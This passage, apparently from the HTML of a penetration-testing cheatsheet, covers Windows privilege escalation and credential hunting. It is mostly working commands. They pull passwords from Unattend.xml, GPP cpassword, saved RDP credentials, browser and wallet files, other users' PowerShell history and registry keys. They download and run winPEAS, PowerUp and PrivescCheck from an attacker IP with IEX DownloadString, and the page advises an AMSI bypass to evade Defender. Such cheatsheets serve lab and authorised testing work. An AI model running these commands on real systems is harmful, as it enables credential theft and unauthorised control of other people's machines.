+</span></span><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\Windows\Panther\Unattend\Unattend.xml <span class="mi">2</span><span class="p">&gt;</span>nul
+</span></span><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\Windows\System32\sysprep\sysprep.xml <span class="mi">2</span><span class="p">&gt;</span>nul
+</span></span><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\sysprep.inf <span class="mi">2</span><span class="p">&gt;</span>nul
+</span></span></code></pre></div><p>GPP cpassword (XML in SYSVOL when on a DC, sometimes cached locally):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">findstr /S /I <span class="s2">&#34;cpassword&#34;</span> \\domain\sysvol\domain\Policies\*.xml
+</span></span></code></pre></div><p>Saved RDP creds:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">cmdkey /list
+</span></span></code></pre></div><p>If <code>cmdkey /list</code> shows targets, use <code>runas /savecred</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">runas /savecred /user:DOMAIN\Administrator <span class="s2">&#34;cmd.exe&#34;</span>
+</span></span></code></pre></div><p>Browser saved creds, SSH config, MobaXterm files:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ChildItem</span> <span class="n">-Recurse</span> <span class="n">-Force</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="n">-Include</span> <span class="s1">&#39;Login Data&#39;</span><span class="p">,</span><span class="s1">&#39;wallet*&#39;</span><span class="p">,</span><span class="s1">&#39;*.ovpn&#39;</span><span class="p">,</span><span class="s1">&#39;*.rdp&#39;</span><span class="p">,</span><span class="s1">&#39;sshconfig*&#39;</span><span class="p">,</span><span class="s1">&#39;.ssh&#39;</span> <span class="mf">2</span><span class="p">&gt;</span><span class="vm">$null</span>
+</span></span></code></pre></div><h2 id="xi-powershell-history" data-heading-permalink="true"><span class="heading-content">xi. PowerShell history</span>
+    <a class="heading-permalink" href="#xi-powershell-history" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>PSReadLine logs every command to a file by default. Read other users&rsquo; history if you have rights:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\*\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadLine</span><span class="p">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="py">txt</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="p">|</span> <span class="nb">ForEach-Object</span> <span class="p">{</span><span class="nb">Write-Host</span> <span class="nv">$_</span><span class="p">.</span><span class="n">FullName</span><span class="p">;</span> <span class="nb">Get-Content</span> <span class="nv">$_</span><span class="p">.</span><span class="n">FullName</span><span class="p">}</span>
+</span></span></code></pre></div><p>This catches inline passwords typed in PowerShell sessions. The single best Windows credential source after LSASS.</p>
+<h2 id="xii-registry-hives-worth-reading" data-heading-permalink="true"><span class="heading-content">xii. Registry hives worth reading</span>
+    <a class="heading-permalink" href="#xii-registry-hives-worth-reading" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">## Saved auto-logon credentials
+</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span> /v DefaultPassword
+</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span> /v DefaultUserName
+</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span> /v AutoAdminLogon
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">## Putty saved sessions
+</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKCU\Software\SimonTatham\PuTTY\Sessions&#34;</span> /s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">## SNMP community strings
+</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Services\SNMP&#34;</span> /s
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">## Saved VNC password
+</span></span><span class="line"><span class="cl">reg query <span class="s2">&#34;HKCU\Software\ORL\WinVNC3\Password&#34;</span>
+</span></span></code></pre></div><h2 id="xiii-run-winpeas" data-heading-permalink="true"><span class="heading-content">xiii. Run winPEAS</span>
+    <a class="heading-permalink" href="#xiii-run-winpeas" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>The Windows equivalent of linpeas, much more verbose. Drop and run:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">## Pipe execution, no disk write:</span>
+</span></span><span class="line"><span class="cl"><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.1/winPEAS.ps1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c">## or save and run:</span>
+</span></span><span class="line"><span class="cl"><span class="nb">iwr </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">1</span><span class="p">/</span><span class="n">winPEASx64</span><span class="p">.</span><span class="py">exe</span> <span class="n">-o</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">wp</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">wp</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></div><p>Read by color the same way as linpeas: red-yellow first.</p>
+<h2 id="xiv-powerup--sherlock--privesccheck" data-heading-permalink="true"><span class="heading-content">xiv. PowerUp / Sherlock / PrivescCheck</span>
+    <a class="heading-permalink" href="#xiv-powerup--sherlock--privesccheck" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>PowerUp is the classic, PrivescCheck is the modern replacement:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.1/PrivescCheck.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-PrivescCheck</span>
+</span></span><span class="line"><span class="cl"><span class="c">## PowerUp (older but still useful):</span>
+</span></span><span class="line"><span class="cl"><span class="n">IEX</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.1/PowerUp.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-AllChecks</span>
+</span></span></code></pre></div><div class="obsidian-callout callout-warning">
+  <div class="obsidian-callout-header">
+    <div class="obsidian-callout-icon" aria-hidden="true">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
+          <path d="M12 9v4"></path>
+          <path d="M12 17h.01"></path></svg>
+    </div>
+    <span class="obsidian-callout-title">AMSI and Defender</span>
+  </div>
+  <div class="obsidian-callout-body">
+    <p>Most ps1 tools are signatured. Either run them through an AMSI bypass first or use a fresh fork (search &ldquo;amsi bypass 2024&rdquo; on GitHub for working versions). See <a href="https://jinpwn.dev/cheatsheets/windows/w10-defender--amsi-evasion/">Defender &amp; AMSI Evasion</a>
+ when those files exist.</p>
+  </div>
+</div>
+<h2 id="xv-triage-checklist" data-heading-permalink="true"><span class="heading-content">xv. Triage checklist</span>
+    <a class="heading-permalink" href="#xv-triage-checklist" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Before opening any privesc file:</p>
+<ul>
+<li><input disabled="" type="checkbox"> <code>whoami /priv</code> output reviewed</li>
+<li><input disabled="" type="checkbox"> <code>whoami /groups</code> for privileged group memberships</li>
+<li><input disabled="" type="checkbox"> Service enum (writable binaries, unquoted paths)</li>
+<li><input disabled="" type="checkbox"> Scheduled tasks as SYSTEM that you can modify</li>
+<li><input disabled="" type="checkbox"> AlwaysInstallElevated check</li>
+<li><input disabled="" type="checkbox"> systeminfo + missing patches</li>
+<li><input disabled="" type="checkbox"> PowerShell history of all users (where readable)</li>
+<li><input disabled="" type="checkbox"> Files of interest (Unattend.xml, GPP, saved creds)</li>
+<li><input disabled="" type="checkbox"> cmdkey /list</li>
+<li><input disabled="" type="checkbox"> winPEAS red-yellow output</li>
+</ul>
+<p>Then work <a href="https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/">PrivEsc - Tokens &amp; Privileges</a>
+ -&gt; <a href="https://jinpwn.dev/cheatsheets/windows/w04-privesc---services--registry/">PrivEsc - Services &amp; Registry</a>
+ -&gt; <a href="https://jinpwn.dev/cheatsheets/windows/w05-privesc---dll--unquoted-paths/">PrivEsc - DLL &amp; Unquoted Paths</a>
+ -&gt; <a href="https://jinpwn.dev/cheatsheets/windows/w06-privesc---credentials--files/">PrivEsc - Credentials &amp; Files</a>
+. Kernel exploits last.</p>
+
+        </div>
+
+        
+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/windows/w01-recon--enum/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">Recon &amp; Enum</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/windows/w03-privesc---tokens--privileges/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">PrivEsc - Tokens &amp; Privileges</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
